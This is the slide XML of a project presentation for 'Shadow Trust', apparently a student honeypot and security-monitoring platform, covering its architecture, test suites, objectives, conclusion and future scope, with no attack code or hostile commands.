      <p:bldP spid="77" grpId="0" animBg="1"/>
      <p:bldP spid="78" grpId="0"/>
      <p:bldP spid="79" grpId="0"/>
      <p:bldP spid="80" grpId="0" animBg="1"/>
      <p:bldP spid="81" grpId="0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2" grpId="0" animBg="1"/>
      <p:bldP spid="93" grpId="0"/>
      <p:bldP spid="94" grpId="0"/>
      <p:bldP spid="95" grpId="0" animBg="1"/>
      <p:bldP spid="96" grpId="0" animBg="1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1792224"/>
            <a:ext cx="5358384" cy="640080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1792224"/>
            <a:ext cx="32004" cy="6400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192024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8A6FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Browser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2176272"/>
            <a:ext cx="4864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40 static pages, plain JavaScript, Chart.js, a server-sent event stream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578608"/>
            <a:ext cx="5358384" cy="640080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578608"/>
            <a:ext cx="32004" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B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270662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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>nginx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2962656"/>
            <a:ext cx="4864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serves the dashboard and the public site, and never the evidence directories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364992"/>
            <a:ext cx="5358384" cy="804671"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820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3364992"/>
            <a:ext cx="32004" cy="804671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349300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35C0E8"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>FastAPI backend on Python 3.11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3749040"/>
            <a:ext cx="48646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152 routes across 31 endpoint modules, asynchronous SQLAlchemy, token auth with role checks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315968"/>
            <a:ext cx="5358384" cy="640080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315968"/>
            <a:ext cx="32004" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8FD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44398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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Engines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4700016"/>
            <a:ext cx="4864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detection, correlation, session, timeline, evidence, compliance, reporting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102352"/>
            <a:ext cx="5358384" cy="640080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102352"/>
            <a:ext cx="32004" cy="6400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" y="523036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58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>MariaDB 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" y="5486400"/>
            <a:ext cx="4864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31 relational models on the asynchronous MySQL driver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792224"/>
            <a:ext cx="5358384" cy="3950208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B22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59" y="197510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8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WHY EACH LANGUAGE IS THERE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59" y="2322576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Courier New"/>
              </a:rPr>
              <a:t>Python 3.11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59" y="2542032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Asynchronous web framework, and the library ecosystem the analysis engines need for signature matching, binary parsing, graph analysis and PDF rendering.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59" y="2999232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Courier New"/>
              </a:rPr>
              <a:t>SQL and SQLAlchemy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59" y="3218688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Relational models with real constraints. Making the content hash the primary key is a schema decision rather than application logic.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59" y="3675887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Courier New"/>
              </a:rPr>
              <a:t>YAML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59" y="389534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Detection rules and attack scenarios are stored as data, so they can be reviewed in a diff and reloaded without a deployment.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59" y="4352544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Courier New"/>
              </a:rPr>
              <a:t>JavaScript, HTML and CSS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59" y="4572000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No build step and no framework. The dashboard is served as static files and reads a single event stream.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59" y="50292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Courier New"/>
              </a:rPr>
              <a:t>Docker Compose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59" y="5248656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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>One file describes fourteen service definitions across four networks, including the two that never bridge.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980176"/>
            <a:ext cx="11055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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>The default deployment is local. A single compose command brings up the whole platform with no cloud account, and the cloud provider is optional.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 animBg="1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9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>133 tests across 16 suites, run against a live database container.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8358" y="1931670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1883664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test_collector_persistence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188366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cursors survive a stop mid-cycle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249424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5069" y="1931670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1883664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test_local_telemetry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188366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three sensor formats reach one schema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249424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8358" y="2407158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2359152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test_detection_rules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235915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rule parsing, thresholds and grouping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2724912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5069" y="2407158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3" y="2359152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test_detection_engine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235915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correlation, incident creation, replay safety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724912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8358" y="2882646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2834640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test_detection_validation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283464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scenario grading and the fixed target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20040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75069" y="2882646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1383" y="2834640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test_timeline_and_evidence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9992" y="283464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ordering and custody integrity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20040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78358" y="3358134"/>
            <a:ext cx="86868" cy="86868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3310128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test_malware_isolation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331012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samples are unreachable by any static path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675888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75069" y="3358134"/>
            <a:ext cx="86868" cy="86868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3" y="3310128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test_container_manager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9992" y="3310128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sandbox policy is applied before start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3675888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8358" y="3833622"/>
            <a:ext cx="86868" cy="86868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" y="3785616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test_analysis_shell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3785616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sandbox events reach the real pipeline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151376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75069" y="3833622"/>
            <a:ext cx="86868" cy="86868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01383" y="3785616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test_lab_lifecycle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9992" y="3785616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provisioning, time limits and reclamation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4151376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8358" y="4309109"/>
            <a:ext cx="86868" cy="86868"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B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" y="4261104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test_docker_provider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426110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local provider behaviour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626864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75069" y="4309109"/>
            <a:ext cx="86868" cy="86868"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B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01383" y="4261104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test_provider_factory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79992" y="426110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local and cloud provider selection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4626864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78358" y="4784597"/>
            <a:ext cx="86868" cy="86868"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B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4672" y="4736592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test_guacamole_integration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473659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lab desktop streaming path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" y="5102352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75069" y="4784597"/>
            <a:ext cx="86868" cy="86868"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B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01383" y="4736592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test_yara_scanner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79992" y="4736592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signature matching correctness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3640" y="5102352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78358" y="5260086"/>
            <a:ext cx="86868" cy="8686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4672" y="5212080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test_health_hardening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521208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the status page cannot leak when disabled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" y="55778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75069" y="5260086"/>
            <a:ext cx="86868" cy="86868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01383" y="5212080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  <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>conftest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79992" y="5212080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fixtures, an isolated database, a fixed clock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63640" y="55778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6928" y="5541264"/>
            <a:ext cx="5358384" cy="768096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66928" y="5541264"/>
            <a:ext cx="32004" cy="768096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672" y="5687568"/>
            <a:ext cx="4882896" cy="512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The security properties, meaning isolation, custody and policy enforcement, are asserted in code rather than only described in documentation.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5541264"/>
            <a:ext cx="5358384" cy="768096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63640" y="5541264"/>
            <a:ext cx="32004" cy="768096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01383" y="5687568"/>
            <a:ext cx="4882896" cy="5120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Stated limits: no load testing at production scale, no third-party penetration test, and the compliance result is self-assessed readiness only.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29" grpId="0" animBg="1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  <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0" animBg="1"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0" animBg="1"/>
      <p:bldP spid="53" grpId="0" animBg="1"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0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/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0" animBg="1"/>
      <p:bldP spid="65" grpId="0" animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0"/>
      <p:bldP spid="68" grpId="0" animBg="1"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0"/>
      <p:bldP spid="72" grpId="0" animBg="1"/>
      <p:bldP spid="73" grpId="0" animBg="1"/>
      <p:bldP spid="74" grpId="0"/>
      <p:bldP spid="75" grpId="0"/>
      <p:bldP spid="76" grpId="0" animBg="1"/>
      <p:bldP spid="77" grpId="0" animBg="1"/>
      <p:bldP spid="78" grpId="0"/>
      <p:bldP spid="79" grpId="0"/>
      <p:bldP spid="80" grpId="0" animBg="1"/>
      <p:bldP spid="81" grpId="0" animBg="1"/>
      <p:bldP spid="82" grpId="0"/>
      <p:bldP spid="83" grpId="0"/>
      <p:bldP spid="84" grpId="0" animBg="1"/>
      <p:bldP spid="85" grpId="0" animBg="1"/>
      <p:bldP spid="86" grpId="0"/>
      <p:bldP spid="87" grpId="0"/>
      <p:bldP spid="88" grpId="0" animBg="1"/>
      <p:bldP spid="89" grpId="0" animBg="1"/>
      <p:bldP spid="90" grpId="0"/>
      <p:bldP spid="91" grpId="0"/>
      <p:bldP spid="92" grpId="0" animBg="1"/>
      <p:bldP spid="93" grpId="0" animBg="1"/>
      <p:bldP spid="94" grpId="0" animBg="1"/>
      <p:bldP spid="95" grpId="0"/>
      <p:bldP spid="96" grpId="0" animBg="1"/>
      <p:bldP spid="97" grpId="0" animBg="1"/>
      <p:bldP spid="98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  <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A3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5C0E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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40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220">
                <a:solidFill>
                  <a:srgbClr val="8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New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76656"/>
            <a:ext cx="1105509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Tahoma"/>
              </a:rPr>
              <a:t>Results, conclusion and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88720"/>
            <a:ext cx="11055096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E7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Shadow Trust  ·  Project-II  ·  PIET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847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7666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485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3047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5123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942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6762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581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84003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2194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00385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58576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16768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74959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33150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91341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49532" y="6583679"/>
            <a:ext cx="114300" cy="32004"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3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07724" y="6583679"/>
            <a:ext cx="114300" cy="32004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1545" y="6492240"/>
            <a:ext cx="438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719072"/>
            <a:ext cx="5358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EACH OBJECTIVE AND WHERE IT IS DEMONSTRATED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8358" y="2077974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0299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20299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three sensors running on an isolated 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20299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slide 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3774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8358" y="2535174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24871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Normalise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9968" y="24871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one schema, keyed by content hash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24871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slide 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28346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8358" y="2992374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29443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Detect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9968" y="29443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six rules, each detection carrying its reason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6592" y="29443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slide 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2918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8358" y="3449574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34015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Correlate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9968" y="34015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incidents with a stored risk calculation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34015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slide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37490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8358" y="3906774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38587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Enrich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29968" y="38587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IOCs, behaviour profile and ATT&amp;CK mapping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6592" y="38587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slides 11 and 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062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8358" y="4363974"/>
            <a:ext cx="86868" cy="868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43159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  <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Prove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29968" y="4315968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hashed evidence and reports with provenance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6592" y="43159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E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>slides 11 and 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4663440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4882896"/>
            <a:ext cx="5358384" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F151B">
              <a:alpha val="94000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1F2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928" y="4882896"/>
            <a:ext cx="32004" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="35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" y="5029200"/>
            <a:ext cx="4901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CONCLUSION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5266944"/>
            <a:ext cx="488289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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Shadow Trust carries one event from a live honeypot through to a graded incident, an ATT&amp;CK mapping, a chain-of-custody record and a scored compliance control, on a single machine, with the reasoning kept at every step and no paid service in the path.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1719072"/>
            <a:ext cx="5358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80">
                <a:solidFill>
                  <a:srgbClr val="35C0E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>FUTURE SCOPE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97510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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Next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84214" y="2288286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01383" y="2231136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Import Sigma rules directly, rather than the current rule format alone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84214" y="2580894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01383" y="252374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Deliver alerts to email and chat when an incident opens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84214" y="2873502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01383" y="281635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Author and test detection rules from inside the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325526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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Later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4214" y="3568446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01383" y="3511296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Federate several honeynet nodes into one view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84214" y="3861054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01383" y="380390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Add external indicator enrichment feeds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4214" y="4153661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01383" y="4096511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Define retention and archival policy for captured telemetry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453542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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Longer term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84214" y="4848606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01383" y="4791456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Automated containment actions on a confirmed incident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84214" y="5141214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01383" y="5084064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Analyst workflow metrics such as time to triage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84214" y="5433822"/>
            <a:ext cx="68580" cy="68580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5E6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01383" y="5376672"/>
            <a:ext cx="5084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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Publish a citable telemetry dataset from captured activity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5797296"/>
            <a:ext cx="5358384" cy="9144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5907024"/>
            <a:ext cx="5358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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/ayushsingh-byte/ShadowTrust-Security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6126480"/>
            <a:ext cx="5358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6E7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Thank you. Questions are welcome.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28" grpId="0"/>
      <p:bldP spid="29" grpId="0" animBg="1"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0" animBg="1"/>
      <p:bldP spid="34" grpId="0" animBg="1"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0"/>
      <p:bldP spid="37" grpId="0"/>
      <p:bldP spid="38" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0"/>
      <p:bldP spid="43" grpId="0" animBg="1"/>
      <p:bldP spid="44" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0" animBg="1"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0"/>
      <p:bldP spid="53" grpId="0" animBg="1"/>
      <p:bldP spid="54" grpId="0" animBg="1"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57" grpId="0"/>
      <p:bldP spid="58" grpId="0" animBg="1"/>
      <p:bldP spid="59" grpId="0" animBg="1"/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0"/>
      <p:bldP spid="65" grpId="0" animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0" animBg="1"/>
      <p:bldP spid="68" grpId="0"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0"/>
      <p:bldP spid="72" grpId="0" animBg="1"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0" animBg="1"/>
      <p:bldP spid="75" grpId="0"/>
      <p:bldP spid="76" grpId="0" animBg="1"/>
      <p:bldP spid="77" grpId="0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 animBg="1"/>
      <p:bldP spid="86" grpId="0"/>
      <p:bldP spid="8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